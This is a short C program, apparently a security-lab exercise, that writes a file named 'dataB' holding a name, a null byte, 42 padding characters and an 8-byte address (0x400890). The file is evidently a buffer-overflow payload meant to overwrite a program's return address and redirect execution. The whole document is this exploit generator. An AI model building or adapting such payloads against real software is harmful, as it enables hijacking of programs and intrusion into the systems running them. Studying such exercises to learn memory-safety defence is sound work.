#include <stdio.h>

int main(void) {
    int i;
    FILE *fp = fopen("dataB", "w");
    
    fputc('E', fp);
    fputc('h', fp);
    fputc('s', fp);
    fputc('a', fp);
    fputc('n', fp);
    fputc('\0', fp);

    for (i = 0; i < 42; i++) {
        fputc('!', fp);
    }

    fputc(0x90, fp);
    fputc(0x08, fp);
    fputc(0x40, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);

    
    
    fclose(fp);
    return 0;
}